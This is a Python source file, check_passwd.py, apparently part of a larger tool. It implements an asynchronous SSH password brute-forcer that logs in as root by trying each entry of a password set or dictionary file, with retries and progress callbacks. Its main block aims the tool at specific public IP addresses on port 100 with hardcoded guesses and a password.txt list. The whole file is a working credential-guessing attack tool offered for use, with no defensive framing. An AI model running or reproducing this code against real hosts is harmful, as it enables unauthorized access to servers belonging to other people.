# -*- coding: utf-8 -*-

# @File    : check_passwd.py
# @Date    : 2021-07-02
# @Author  : 王超逸
# @Brief   : 
import asyncio, asyncssh
from asyncssh import Error, PermissionDenied
from logging import getLogger
from check_ssh_open import check_ssh_open

logger = getLogger(__name__)
gave_up_logger = getLogger("gave_up")


async def check_passwd(host: str, passwd_set: set, port: int = 22, username: str = "root", progress_callback=None):
    try:
        if not await check_ssh_open(host, port):
            gave_up_logger.info(f"@{host}:{port} 没有打开ssh，放弃")
            return False
    except:
        logger.exception(f"@{host}:{port}检查ssh协议是否打开时发生异常，放弃")
        gave_up_logger.info(f"@{host}:{port}检查ssh协议是否打开时发生异常，放弃")
        return False

    for i in passwd_set:
        try:
            error_flag = True
            connect_str = f"{username}:{i}@{host}:{port}"
            for _ in range(3):
                try:
                    connect = await asyncio.wait_for(
                        asyncssh.connect(host, port, username=username, password=i, known_hosts=None),
                        10)
                    connect.close()
                    error_flag = False
                    return i, connect_str
                except PermissionDenied:
                    logger.debug(f"PermissionDenied {connect_str}")
                    error_flag = False
                    break
                except (OSError, Error):
                    logger.exception(f"{connect_str} 试密码发生异常")
                except (TimeoutError, asyncio.TimeoutError):
                    logger.info(f"{connect_str} 超时")
            if error_flag:
                gave_up_logger.info(f"{connect_str} 多次失败，放弃")
                return False

        finally:
            if progress_callback:
                progress_callback(i)
    return False


if __name__ == '__main__':
    def main():
        from load_file import read_password_dict
        from logging_config import config_logging
        config_logging()
        corn = check_passwd("139.224.83.179", {"Qq147258", "AbaAbaAba", "Qq147258.", }, port=100)
        corn2 = check_passwd("139.224.83.17", {"Qq147258", "AbaAbaAba"}, port=100)
        corn3 = check_passwd("139.224.83.179", read_password_dict("password.txt"), port=100)
        print(asyncio.run(corn))
        print(asyncio.run(corn2))
        print(asyncio.run(corn3))


    main()
